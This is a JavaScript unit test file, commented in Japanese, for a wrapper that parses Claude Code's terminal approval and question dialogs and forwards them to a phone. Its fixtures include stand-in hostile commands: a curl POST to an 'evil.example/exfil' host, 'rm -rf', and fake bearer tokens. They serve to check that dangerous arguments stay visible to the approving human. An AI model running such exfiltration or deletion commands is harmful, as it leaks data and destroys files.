/**
 * test-parse-dialog.js
 *
 * claude-wrapper.js の parseDialog / stripAnsi をユニットテストする。
 * 引数でログファイルが渡されればそれも追加で解析する。
 *
 * 使い方:
 *   node test-parse-dialog.js                       ← ユニットテストのみ
 *   node test-parse-dialog.js /tmp/pty.log          ← ユニットテスト + 実 PTY ログ解析
 */

const fs = require('fs')

const {
  parseDialog,
  stripAnsi,
  validateAnswer,
  isTabbedDialog,
  validateMultiAnswer,
  screenTextFromBuffer,
  validateFreeText,
  extractOptions,
  composeEndMarkerPattern,
  isLostRegistration,
  extractCodexShortcut,
  resolveCodexInjection,
  isCodexCommand,
  BOX_CHARS,
  RULE_CHARS,
  PROMPT_BOX_ANCHOR_CHARS,
  TAB_MARK_CHARS,
  TAB_ARROW_CHAR,
  CURSOR_CHAR,
  LINE_START_CHARS,
  TAB_NAV_RE,
  EXIT_PLAN_END_PATTERN,
  DEFAULT_END_MARKER,
} = require('./claude-wrapper.js')

let failed = 0
let passed = 0

function assertEq(label, actual, expected) {
  const ok =
    typeof expected === 'object'
      ? JSON.stringify(actual) === JSON.stringify(expected)
      : actual === expected
  if (ok) {
    passed++
    console.log(`  ✅ ${label}`)
  } else {
    failed++
    console.log(`  ❌ ${label}`)
    console.log(`     expected: ${JSON.stringify(expected)}`)
    console.log(`     actual  : ${JSON.stringify(actual)}`)
  }
}

// -------------------------------------------------------
// 1. stripAnsi: cursor-right (\x1b[<n>C) を空白に展開する
// -------------------------------------------------------
console.log('[1] stripAnsi cursor-right expansion')
{
  const input = 'Do\x1b[1Cyou\x1b[1Cwant\x1b[1Cto\x1b[1Ccreate?'
  assertEq('単一空白展開', stripAnsi(input), 'Do you want to create?')

  const input2 = 'A\x1b[3CB'
  assertEq('複数列ジャンプ', stripAnsi(input2), 'A   B')

  const input3 = 'X\x1b[CY'
  assertEq('数字省略 (= 1)', stripAnsi(input3), 'X Y')

  const input4 = 'A\x1b[1CB\x1b[1A'
  assertEq('cursor-right 以外の CSI は除去', stripAnsi(input4), 'A B')
}

// -------------------------------------------------------
// 2. parseDialog: 標準的な Write ダイアログ
// -------------------------------------------------------
console.log('\n[2] parseDialog: Write ダイアログ (●Tool 行あり)')
{
  const buf = [
    '● Write(test.txt)',
    '─────',
    ' Create file',
    ' test.txt',
    '╌╌╌╌',
    ' Do you want to create test.txt?',
    ' ❯ 1. Yes',
    '   2. Yes, allow shift+tab',
    '   3. No',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('prompt', r && r.prompt, 'Do you want to create test.txt?')
  assertEq('tool', r && r.tool, 'Write')
  assertEq('args', r && r.args, 'test.txt')
  assertEq('options', r && r.options, ['Yes', 'Yes, allow shift+tab', 'No'])
}

// -------------------------------------------------------
// 3. parseDialog: tool=Unknown 時に box ラベルから Bash を推測
// -------------------------------------------------------
console.log('\n[3] parseDialog: Bash fallback (●Tool 行なし)')
{
  const buf = [
    '─────',
    ' Bash command',
    '   rm /home/koishi/test.txt',
    '   Delete test.txt',
    '╌╌╌╌',
    ' Do you want to proceed?',
    ' ❯ 1. Yes',
    '   2. No',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('prompt', r && r.prompt, 'Do you want to proceed?')
  assertEq('tool', r && r.tool, 'Bash')
  // args は "Bash command" 直後の対象行を拾えていれば OK（rm コマンド全文 or 短縮）
  assertEq(
    'args に rm 文字列を含む',
    !!(r && r.args && r.args.includes('rm /home/koishi/test.txt')),
    true
  )
  assertEq('options', r && r.options, ['Yes', 'No'])
}

// -------------------------------------------------------
// 4. parseDialog: 旧コンパクト形式（空白なし）でも検出はできる
// -------------------------------------------------------
console.log('\n[4] parseDialog: 空白なし旧形式')
{
  const buf = [
    '─────',
    ' Createfile',
    ' test.txt',
    '╌╌╌╌',
    ' Doyouwanttocreatetest.txt?',
    ' ❯1Yes',
    '  2Yesallowshift+tab',
    '  3No',
    ' Esctocancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('options 数 = 3', r && r.options.length, 3)
  assertEq('tool=Write (Createfile ラベル fallback)', r && r.tool, 'Write')
}

// -------------------------------------------------------
// 5. parseDialog: 偽陽性除外（カーソル `❯` がない場合は null）
// -------------------------------------------------------
console.log('\n[5] parseDialog: 偽陽性除外')
{
  const buf = ' Some output mentioning Esc to cancel? but no dialog'
  assertEq('カーソル無し → null', parseDialog(buf), null)
}

// -------------------------------------------------------
// 6. parseDialog: AskUserQuestion 型 4 択（tool 行なし・shift+tab 不在・長文）
// -------------------------------------------------------
console.log('\n[6] parseDialog: AskUserQuestion 4 択')
{
  const buf = [
    '─────',
    ' Auto-Switch Configuration',
    '╌╌╌╌',
    ' Which auto-switch mode do you prefer for short tasks?',
    ' ❯ 1. Skip auto-switch (Recommended)',
    '   2. Enable for short tasks only when the model is idle',
    '   3. Enable for all tasks regardless of token cost',
    '   4. Decide each time with a confirmation dialog',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('options 数 = 4', r && r.options.length, 4)
  assertEq('tool=AskUserQuestion', r && r.tool, 'AskUserQuestion')
  assertEq(
    'options[0] 冒頭が欠けない',
    r && r.options[0].startsWith('Skip auto-switch'),
    true
  )
}

// -------------------------------------------------------
// 6b. parseDialog: ExitPlanMode(プラン承認)プロンプト
//     フッタが "Esc to cancel" ではなく "shift+tab to approve with this feedback"。
//     END_MARKER の OR 拡張で検出でき、フッタ行が options に混入しないことを確認。
// -------------------------------------------------------
console.log('\n[6b] parseDialog: ExitPlanMode プラン承認 4 択')
{
  const buf = [
    '─────',
    ' Claude has written up a plan and is ready to execute. Would you like to proceed?',
    '',
    ' ❯ 1. Yes, and use auto mode',
    '   2. Yes, manually approve edits',
    '   3. No, refine with Ultraplan on Claude Code on the web',
    '   4. Tell Claude what to change',
    '      shift+tab to approve with this feedback',
    ' ctrl+g to edit in  VS Code',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('tool=ExitPlanMode(AUQ に化けない)', r && r.tool, 'ExitPlanMode')
  assertEq('args 空(対象ファイル/コマンドを持たない)', r && r.args, '')
  assertEq(
    'prompt',
    r && r.prompt,
    'Claude has written up a plan and is ready to execute. Would you like to proceed?'
  )
  assertEq('options 数 = 4', r && r.options.length, 4)
  assertEq('options 全文', r && r.options, [
    'Yes, and use auto mode',
    'Yes, manually approve edits',
    'No, refine with Ultraplan on Claude Code on the web',
    'Tell Claude what to change',
  ])
  assertEq(
    'フッタ(shift+tab / ctrl+g)が option に混入しない',
    r && r.options[3],
    'Tell Claude what to change'
  )
}

// -------------------------------------------------------
// 6c. parseDialog: AskUserQuestion の上方に前ターンの `● Bash(...)` が残っているケース。
//     実機(Agent View 下、v2.1.178)で観測した「スマホに [Bash] uname -a と誤ツール名が
//     出る」回帰の再現。AUQ は専用の ●AskUserQuestion() 行を持たないため、古い ●Bash() を
//     継承してはならない。完全フレーム(1..6 連番)なら tool=AskUserQuestion + 選択肢正常。
// -------------------------------------------------------
console.log('\n[6c] parseDialog: AUQ の上に古い ●Bash() が残っても継承しない')
{
  const buf = [
    '● Bash(uname -a)',
    '   Linux DESKTOP-SKSREPJ 6.6.87.2-microsoft-standard-WSL2 x86_64 GNU/Linux',
    '● それぞれ別々に実行しました。',
    '─────',
    ' ☐ 好きな色',
    ' 好きな色は?',
    ' ❯ 1. 赤',
    '      情熱的で力強い色',
    '   2. 青',
    '      冷静で落ち着いた色',
    '   3. 緑',
    '      自然を感じる安らぎの色',
    '   4. 黄',
    '      明るく元気な色',
    '   5. Type something.',
    '   6. Chat about this',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('tool=AskUserQuestion(古い Bash を継承しない)', r && r.tool, 'AskUserQuestion')
  assertEq('prompt', r && r.prompt, '好きな色は?')
  assertEq('options 数 = 6', r && r.options.length, 6)
  assertEq('options[0] = 赤', r && r.options[0].startsWith('赤'), true)
  assertEq('options[1] = 青(完全フレームで青が欠けない)', r && r.options[1].startsWith('青'), true)
}

// -------------------------------------------------------
// 6d. parseDialog: 部分描画フレーム(option 2 の番号欠落で 1,3,4,5,6)は転送しない。
//     5b 内容完全性ガード = 1..N の完全集合でなければ null(青消失・融合の転送を防ぐ)。
// -------------------------------------------------------
console.log('\n[6d] parseDialog: 部分描画(先頭/中間欠落)は null で弾く')
{
  // option 2 (青) の番号行が描画されず 1,3,4,5,6 のみ = 部分フレーム
  const partial = [
    '─────',
    ' 好きな色は?',
    ' ❯ 1. 赤',
    '      情熱的で力強い色',
    '      冷静で落ち着いた色',
    '   3. 緑',
    '   4. 黄',
    '   5. Type something.',
    '   6. Chat about this',
    ' Esc to cancel',
  ].join('\n')
  assertEq('番号歯抜け(2 欠落)は null', parseDialog(partial), null)
  // 先頭 1 が欠落して 3,4,5 のみ = やはり部分フレーム
  const headMissing = [
    '─────',
    ' 好きな色は?',
    ' ❯ 3. 緑',
    '   4. 黄',
    '   5. Type something.',
    ' Esc to cancel',
  ].join('\n')
  assertEq('先頭欠落(1 始まりでない)は null', parseDialog(headMissing), null)
}

// -------------------------------------------------------
// 6e. parseDialog: 実在する ●Tool() を持つツール承認は、4 択・shift+tab 欠落でも
//     AskUserQuestion と誤分類しない(反例)。誤分類すると tool 継承が走らず
//     args(危険なコマンド引数)がスマホ側で空欄になる。
// -------------------------------------------------------
console.log('\n[6e] parseDialog: 4 択ツール承認を AUQ と誤判定しない(args 秘匿防止)')
{
  const buf = [
    '● Bash(rm -rf /tmp/x)',
    '─────',
    ' Run command',
    ' Do you want to proceed?',
    ' ❯ 1. Yes',
    '   2. Yes, for this session',
    '   3. No',
    '   4. No, and tell Claude what to do differently',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('tool=Bash(AUQ に化けない)', r && r.tool, 'Bash')
  assertEq('args に危険コマンドが残る', r && /rm -rf \/tmp\/x/.test(r.args), true)
}

// -------------------------------------------------------
// 6f. parseDialog: 重畳フレーム(同一番号が 2 回 = 旧+新フレーム重なり)は null で弾く。
//     Map dedupe で握り潰すと 1..N 連番として擦り抜けるため、重複検出で fail-closed。
// -------------------------------------------------------
console.log('\n[6f] parseDialog: 重複番号の重畳フレームは null で弾く')
{
  const buf = [
    '─────',
    ' 好きな色は?',
    ' ❯ 1. 赤',
    '   2. 青',
    '   3. 緑',
    '   1. 赤(旧フレーム残り)',
    '   2. 青(旧フレーム残り)',
    '   3. 緑(旧フレーム残り)',
    ' Esc to cancel',
  ].join('\n')
  assertEq('重複番号フレームは null', parseDialog(buf), null)
  const { duplicate } = extractOptions(' ❯ 1. A\n   2. B\n   1. A2\n   2. B2')
  assertEq('extractOptions が duplicate を立てる', duplicate, true)
}

// -------------------------------------------------------
// 6g. parseDialog: option 本文に "shift+tab" を含む通常ツール承認(終端 Esc to cancel)を
//     ExitPlanMode と誤判定しない。ExitPlanMode 判定は終端マーカー種別で行うため、
//     最終マッチが Esc to cancel なら option 内の shift+tab に反応せず tool 継承が走る。
// -------------------------------------------------------
console.log('\n[6g] parseDialog: option 内 shift+tab を ExitPlanMode と誤判定しない')
{
  const buf = [
    '● Bash(echo hi)',
    '─────',
    ' Run command',
    ' Do you want to proceed?',
    ' ❯ 1. Yes',
    '   2. Yes, allow shift+tab',
    '   3. No',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('tool=Bash(ExitPlanMode に化けない)', r && r.tool, 'Bash')
}

// -------------------------------------------------------
// 6h. parseDialog: ExitPlanMode の prompt が端末幅で hard-wrap(実改行込み)され 2 行に
//     なっても、1 段落に連結してフル復元する(実機 cols=69 で観測した「like to proceed?」欠け)。
// -------------------------------------------------------
console.log('\n[6h] parseDialog: ExitPlanMode prompt の hard-wrap 複数行を連結')
{
  const buf = [
    '─────────────────────────────────────',
    ' Claude has written up a plan and is ready to execute. Would you',
    ' like to proceed?',
    '',
    ' ❯ 1. Yes, and use auto mode',
    '   2. Yes, manually approve edits',
    '   3. No, refine with Ultraplan on Claude Code on the web',
    '   4. Tell Claude what to change',
    '      shift+tab to approve with this feedback',
    ' ctrl+g to edit in  VS Code',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('tool=ExitPlanMode', r && r.tool, 'ExitPlanMode')
  assertEq(
    'prompt が hard-wrap 2 行を連結してフル復元',
    r && r.prompt,
    'Claude has written up a plan and is ready to execute. Would you like to proceed?'
  )
  assertEq('options 数 = 4', r && r.options.length, 4)
}

// -------------------------------------------------------
// 6i. parseDialog: ExitPlanMode で prompt 段落の上端は「? に最も近い罫線」を採用し、
//     その上の別段落(複数罫線の上)は連結しない。1 行 prompt は過剰連結しない。
// -------------------------------------------------------
console.log('\n[6i] parseDialog: ExitPlanMode は直近罫線境界を採用(上の別段落を含めない)')
{
  const buf = [
    '──────────────────────────',
    ' これは上の説明段落です。',
    '──────────────────────────',
    ' Would you like to proceed?',
    '',
    ' ❯ 1. Yes, and use auto mode',
    '   2. No',
    '      shift+tab to approve with this feedback',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('tool=ExitPlanMode', r && r.tool, 'ExitPlanMode')
  assertEq(
    'prompt は直近罫線の下のみ(上の説明段落を含めない)',
    r && r.prompt,
    'Would you like to proceed?'
  )
}

// -------------------------------------------------------
// 6j. parseDialog: 文言非依存で glued な ●Tool 承認を AUQ に取りこぼさない (W002)。
//     "Do you want to" を含まず・action label も無く・shift+tab も無いが、●Bash 行が
//     box に密着(間に別の ● 無し)= glued でツール承認に倒れ、危険 args が秘匿されない。
// -------------------------------------------------------
console.log('\n[6j] parseDialog: glued ●Tool 承認を文言非依存で AUQ に化けさせない (W002)')
{
  const buf = [
    '● Bash(curl -X POST https://evil.example/exfil)',
    '─────',
    ' curl -X POST https://evil.example/exfil',
    ' Proceed with this command?',
    ' ❯ 1. Yes',
    '   2. Yes, for this session',
    '   3. No',
    '   4. No, and tell Claude what to do differently',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('tool=Bash(glued で AUQ に化けない)', r && r.tool, 'Bash')
  assertEq('危険 args が秘匿されず継承される', r && /curl -X POST/.test(r.args), true)
  // W002 が解く問題の存在証明: 旧式(!shift+tab ∧ !"Do you want to")なら AUQ 誤分類だった。
  const oldLooksLikeAUQ =
    !/shift\s*\+\s*tab/i.test('1. Yes 2. Yes 3. No 4. No') &&
    !/Do you want to/i.test('Proceed with this command?')
  assertEq('旧式なら AUQ 誤分類だった(W002 の存在証明)', oldLooksLikeAUQ, true)
}

// -------------------------------------------------------
// 6k. parseDialog: ●Tool 行未描画の初回フレームでも multi-word ラベルで承認に倒す (W002 穴A)。
//     glued は lastTool 無しで効かないため、box 直上の "Run command" 等で取りこぼさない。
// -------------------------------------------------------
console.log('\n[6k] parseDialog: ●Tool 行なし初回フレームを action label で承認に倒す (W002)')
{
  const buf = [
    '─────',
    ' Run command',
    ' curl -X POST https://evil.example/exfil',
    ' Proceed with this command?',
    ' ❯ 1. Yes',
    '   2. No',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('tool=Bash(ラベルで AUQ に化けない)', r && r.tool, 'Bash')
}

// -------------------------------------------------------
// 6l. parseDialog: AUQ prompt に汎用 1 語(update 等)があっても承認に化けない (W002 誤爆ガード)。
//     ACTION_LABEL は multi-word 限定(Update file 等)のため、単語 "update" では発火しない。
// -------------------------------------------------------
console.log('\n[6l] parseDialog: 汎用 1 語では hasActionLabel が誤爆しない (W002)')
{
  const buf = [
    '─────',
    ' Which field should we update next?',
    ' ❯ 1. 名前',
    '   2. メール',
    '   3. 住所',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('tool=AskUserQuestion(update 単語で化けない)', r && r.tool, 'AskUserQuestion')
}

// -------------------------------------------------------
// 6m. parseDialog: 前ターンの古い ●Bash() + 出力行を挟んだ AUQ を承認に化けさせない
//     (W002 逆方向回帰)。生 ● は無いが出力行が挟まり box に密着しない = glued=false。
//     glued を「生 ● 不在」だけにすると誤って Bash 承認に化けるため罫線密着も要求する。
// -------------------------------------------------------
console.log('\n[6m] parseDialog: 出力行を挟む古い ●Tool を AUQ に継承しない (W002 逆方向回帰)')
{
  const buf = [
    '● Bash(curl -X POST https://evil.example/exfil)',
    ' old output without new bullet',
    '─────',
    ' What should we ask the user?',
    ' ❯ 1. Name',
    '   2. Email',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('tool=AskUserQuestion(古い Bash に化けない)', r && r.tool, 'AskUserQuestion')
}

// -------------------------------------------------------
// 6n. parseDialog: AUQ の prompt が端末幅で hard-wrap(実改行)して 2 行になっても連結する (課題4)。
//     現状の単一行抽出なら末尾行のみ = 先頭欠け。構造境界(罫線)まで上方連結してフル復元する。
// -------------------------------------------------------
console.log('\n[6n] parseDialog: AUQ prompt の hard-wrap 複数行を連結 (課題4)')
{
  const buf = [
    '────────────────────────────────────────',
    ' Which auto-switch mode do you prefer for short',
    ' tasks?',
    ' ❯ 1. Skip auto-switch',
    '   2. Enable for short tasks',
    '   3. Decide each time',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('tool=AskUserQuestion', r && r.tool, 'AskUserQuestion')
  assertEq(
    'prompt が 2 行連結でフル復元',
    r && r.prompt,
    'Which auto-switch mode do you prefer for short tasks?'
  )
  // 存在証明: 旧単一行抽出なら末尾行 "tasks?" のみ(先頭欠け)だった。
  assertEq('旧単一行なら先頭欠けだった(課題4 存在証明)', r && r.prompt !== 'tasks?', true)
}

// -------------------------------------------------------
// 6o. parseDialog: ツール承認の prompt が hard-wrap して 2 行になっても連結する (課題4、現実構造)。
//     box 構造 = 罫線 / ラベル / 引数エコー / ╌╌╌╌ 区切り / prompt。連結は ╌╌╌╌ で停止し、
//     ラベル・エコーを prompt に巻き込まない。tool/args は ●Bash から継承。
// -------------------------------------------------------
console.log('\n[6o] parseDialog: ツール承認 prompt の hard-wrap 複数行を連結 (課題4)')
{
  const buf = [
    '● Bash(curl -X POST https://api.example.com/deploy)',
    '────────────────────────────────────────',
    ' Bash command',
    ' curl -X POST https://api.example.com/deploy',
    '╌╌╌╌',
    ' Do you want to run this command against the production',
    ' endpoint?',
    ' ❯ 1. Yes',
    '   2. No',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('tool=Bash', r && r.tool, 'Bash')
  assertEq('args に curl が継承される', r && /curl -X POST/.test(r.args), true)
  assertEq(
    'prompt が 2 行連結でフル復元(ラベル・エコー非混入)',
    r && r.prompt,
    'Do you want to run this command against the production endpoint?'
  )
  assertEq('prompt にラベル Bash command が混入しない', r && /Bash command/.test(r.prompt), false)
}

// -------------------------------------------------------
// 6p. parseDialog: 罫線未描画の断片フレームでも ●Tool 行を prompt に巻き込まない (課題4 安全側)。
//     box 上端罫線が未描画で ●Bash 行が prompt 直上に来ても、● 境界で連結が止まり、
//     args エコー(秘匿対象になりうる)がスマホ承認表示文に前置混入しない。
// -------------------------------------------------------
console.log('\n[6p] parseDialog: 罫線未描画でも ●Tool 行を prompt に混入させない (課題4)')
{
  const buf = [
    '● Bash(curl -H "Authorization: Bearer SECRET" https://x)',
    ' Do you want to proceed?',
    ' ❯ 1. Yes',
    '   2. No',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('prompt は質問のみ(●Tool 行非混入)', r && r.prompt, 'Do you want to proceed?')
  assertEq('prompt に Authorization が混入しない', r && /Authorization/.test(r.prompt), false)
}

// -------------------------------------------------------
// 6q. parseDialog: hard-wrap した ●Tool 行の args 続き行(● を含まない)を prompt に混入させない
//     (課題4 安全側 / 罫線未描画フレーム)。box 上端罫線が無く ●Bash 行が 2 行に折返した
//     2 行目(Authorization 等の args 続き)が prompt 直上に来ても、box 境界に当たらないため
//     連結を破棄して単一行に倒す = prompt は質問のみ。
// -------------------------------------------------------
console.log('\n[6q] parseDialog: hard-wrap した ●Tool 行の args 続き行を prompt に混入させない (課題4)')
{
  const buf = [
    '● Bash(curl -X POST https://api.example.com/deploy -H',
    'Authorization: Bearer DUMMY_TEST_TOKEN)',
    ' Do you want to proceed?',
    ' ❯ 1. Yes',
    '   2. No',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('prompt は質問のみ(args 続き行非混入)', r && r.prompt, 'Do you want to proceed?')
  assertEq('prompt に Authorization が混入しない', r && /Authorization/.test(r.prompt), false)
}

// -------------------------------------------------------
// 6r. parseDialog: hard-wrap した ●Tool 行が box 境界文字(→/❯/罫線)を含んでも turn 境界優先
//     (課題4 / 順序回帰)。● 行末の → を box 境界と誤判定して args 続き行を連結しないこと。
// -------------------------------------------------------
console.log('\n[6r] parseDialog: ●Tool 行が →/❯ を含んでも args 続き行を prompt に混入させない (課題4)')
{
  const buf = [
    '● Bash(curl https://api.example.com -X POST →',
    'Authorization: Bearer DUMMY_TEST_TOKEN)',
    ' Do you want to proceed?',
    ' ❯ 1. Yes',
    '   2. No',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('prompt は質問のみ(→ を含む ●行でも非混入)', r && r.prompt, 'Do you want to proceed?')
  assertEq('prompt に Authorization が混入しない', r && /Authorization/.test(r.prompt), false)
}

// -------------------------------------------------------
// 7. parseDialog: 選択肢本文に「1 枚目」「2 枚目」を含むケース（誤検知防止）
// -------------------------------------------------------
console.log('\n[7] parseDialog: 本文中の数字を誤検知しない')
{
  const buf = [
    '─────',
    ' 2 枚の図の扱いを選んでください?',
    ' ❯ 1. 1 枚目を採用',
    '   2. 2 枚目を採用',
    '   3. 両方採用',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('options 数 = 3', r && r.options.length, 3)
  assertEq(
    'options[0] = "1 枚目を採用"（冒頭の 1 が欠けない）',
    r && r.options[0],
    '1 枚目を採用'
  )
  assertEq(
    'options[1] = "2 枚目を採用"（冒頭の 2 が欠けない）',
    r && r.options[1],
    '2 枚目を採用'
  )
  assertEq('options[2] = "両方採用"', r && r.options[2], '両方採用')
  assertEq(
    'prompt 冒頭の "2 " が欠けない',
    r && r.prompt.startsWith('2 枚の図'),
    true
  )
}

// -------------------------------------------------------
// 8. parseDialog: 6 択 + validateAnswer の数字キー範囲
// -------------------------------------------------------
console.log('\n[8] parseDialog: 6 択 + validateAnswer')
{
  // 注: "Type something" / "Chat about this" は Claude TUI の組み込みフッタ
  // (常に末尾自動付加)で、parseDialog は意図的に除外する。
  // ここでは 6 個の業務選択肢のみのケースをテストする。
  const buf = [
    '─────',
    ' What would you like to do next?',
    ' ❯ 1. Continue interview',
    '   2. Skip interview and plan immediately',
    '   3. Review and edit',
    '   4. Restart',
    '   5. Pause and review',
    '   6. Cancel session',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('options 数 = 6', r && r.options.length, 6)
  if (r) {
    assertEq('validateAnswer("5") = "5"', validateAnswer('5', r.options), '5')
    assertEq('validateAnswer("6") = "6"', validateAnswer('6', r.options), '6')
    assertEq(
      'validateAnswer("7") = null（範囲外）',
      validateAnswer('7', r.options),
      null
    )
    assertEq(
      'validateAnswer(完全一致) で番号に正規化',
      validateAnswer('Pause and review', r.options),
      '5'
    )
  }
}

// -------------------------------------------------------
// 8c. parseDialog: Type something / Chat about this は表示する(v1.11.1 で復活)
// -------------------------------------------------------
console.log('\n[8c] parseDialog: 全 option を保持(filter なし)')
{
  // v1.11.1 で TUI_FOOTER_PATTERNS / cutoff filter を撤回。
  // Type something / Chat about this もスマホに表示する(v1.12.0 でテキスト送信
  // 経路追加予定)。中間位置・末尾位置を問わず保持される。
  const buf = [
    '─────',
    ' Which action?',
    ' ❯ 1. Continue',
    '   2. Chat about this proposal',
    '   3. Type something custom',
    '   4. Skip',
    '   5. Type something.',
    '   6. Chat about this',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('options 数 = 6 (filter 撤回で全保持)', r && r.options.length, 6)
  if (r) {
    assertEq('option[0]', r.options[0], 'Continue')
    assertEq('option[4] = "Type something."', r.options[4], 'Type something.')
    assertEq('option[5] = "Chat about this"', r.options[5], 'Chat about this')
  }
}

// -------------------------------------------------------
// 8d. parseDialog: option 末尾の TUI ヒント文字列を除去
// -------------------------------------------------------
console.log('\n[8d] parseDialog: option 末尾の "Enter to select" 等を切り捨て')
{
  // 最後の option に Claude TUI のキー操作ヒントが連結する典型ケース。
  // 行構造が破綻している(\n が不足する)時、option 末尾までヒント文字列が入る。
  const buf =
    '──── 朝食派ですか、夜食派ですか? ❯ 1. 朝食派 2. 夜食派 3. ' +
    'Chat about this Enter to select · Tab/Arrow keys to navigate · Esc to cancel'
  const r = parseDialog(buf)
  // 末尾連続フッタは除外されるので、3. Chat about this は消える(末尾)
  // 期待: options = ["朝食派", "夜食派"]、ヒント文字列は混入しない
  assertEq('検出できる', !!r, true)
  if (r) {
    assertEq(
      'いずれの option にも "Enter to select" を含まない',
      r.options.some((o) => /Enter\s+to\s+select/i.test(o)),
      false
    )
    assertEq(
      'いずれの option にも "Tab/Arrow keys" を含まない',
      r.options.some((o) => /Tab\s*\/\s*Arrow\s+keys/i.test(o)),
      false
    )
  }
}

// -------------------------------------------------------
// 8b. parseDialog: Type something / Chat about this を含む 5 option を表示
// -------------------------------------------------------
console.log('\n[8b] parseDialog: 全 option を結果に含める(v1.11.1 で復活)')
{
  const buf = [
    '─────',
    ' 朝食派ですか、夜食派ですか?',
    ' ❯ 1. 朝食派',
    '   2. 夜食派',
    '   3. どちらも',
    '   4. Type something.',
    '   5. Chat about this',
    ' Esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('options 数 = 5 (全保持)', r && r.options.length, 5)
  if (r) {
    assertEq('option[0] = "朝食派"', r.options[0], '朝食派')
    assertEq('option[3] = "Type something."', r.options[3], 'Type something.')
    assertEq('option[4] = "Chat about this"', r.options[4], 'Chat about this')
  }
}

// -------------------------------------------------------
// 9. isTabbedDialog: タブバー検出
// -------------------------------------------------------
console.log('\n[9] isTabbedDialog: タブ式 UI 検出')
{
  const tabbed = [
    '□統合方式 □図再生成 ✓整理 □tier ✓Submit →',
    ' 新候補を既存レポートにどう統合しますか?',
    ' ❯ 1. A 案',
    '   2. B 案',
    ' Esc to cancel · Tab/Arrow keys to navigate',
  ].join('\n')
  assertEq('タブ式 → true', isTabbedDialog(tabbed), true)

  const single = [
    '● Write(test.txt)',
    ' Do you want to create test.txt?',
    ' ❯ 1. Yes',
    '   2. No',
    ' Esc to cancel',
  ].join('\n')
  assertEq('単一質問 → false', isTabbedDialog(single), false)

  assertEq('空文字 → false', isTabbedDialog(''), false)
}

// -------------------------------------------------------
// 10. validateMultiAnswer: 複合質問の回答配列検証
// v1.12.0: 戻り値は {num, text?} 配列に正規化。後方互換で string 要素も受容。
// -------------------------------------------------------
console.log('\n[10] validateMultiAnswer')
{
  const tabs = [
    { prompt: 'q1', options: ['a', 'b', 'c'] },
    { prompt: 'q2', options: ['x', 'y'] },
    { prompt: 'q3', options: ['p', 'q', 'r', 's'] },
  ]
  assertEq(
    '正常 ["1","2","3"](string 入力 → {num} 出力)',
    validateMultiAnswer(['1', '2', '3'], tabs),
    [{ num: '1' }, { num: '2' }, { num: '3' }]
  )
  assertEq('長さ不一致 → null', validateMultiAnswer(['1', '2'], tabs), null)
  assertEq('範囲外 → null', validateMultiAnswer(['1', '3', '1'], tabs), null) // q2 は 1〜2 のみ
  assertEq('数字以外 → null', validateMultiAnswer(['1', 'x', '1'], tabs), null)
  assertEq('空配列 + 空 tabs → null', validateMultiAnswer([], []), null)
  assertEq('null tabs → null', validateMultiAnswer(['1'], null), null)
  assertEq('9 件超 → null', validateMultiAnswer(['1', '1', '1', '1', '1', '1', '1', '1', '1', '1'], new Array(10).fill({ options: ['a'] })), null)

  // v1.12.0 (D1): {num, text?} オブジェクト入力対応。text 添付は Type something
  // option 限定。Chat about this を指す回答も reject(codex B002/B003 防御)。
  const tabsFT = [
    { prompt: 'q1', options: ['a', 'b', 'c', 'Type something.', 'Chat about this'] },
    { prompt: 'q2', options: ['x', 'y'] },
    { prompt: 'q3', options: ['p', 'q', 'r', 's'] },
  ]
  assertEq(
    '{num=4, text} 入力(Type something 指定)→ 正規化',
    validateMultiAnswer([{ num: '4', text: 'hello' }, '2', '3'], tabsFT),
    [{ num: '4', text: 'hello' }, { num: '2' }, { num: '3' }]
  )
  assertEq(
    'string と {num,text} 混在(Type something 指定)',
    validateMultiAnswer(['1', '2', { num: '3' }], tabsFT),
    [{ num: '1' }, { num: '2' }, { num: '3' }]
  )
  assertEq(
    'text に制御文字 → null',
    validateMultiAnswer([{ num: '4', text: 'a\nb' }, '2', '3'], tabsFT),
    null
  )
  assertEq(
    'text に ESC → null',
    validateMultiAnswer([{ num: '4', text: 'a\x1bb' }, '2', '3'], tabsFT),
    null
  )
  assertEq(
    'text が空文字 → null',
    validateMultiAnswer([{ num: '4', text: '' }, '2', '3'], tabsFT),
    null
  )
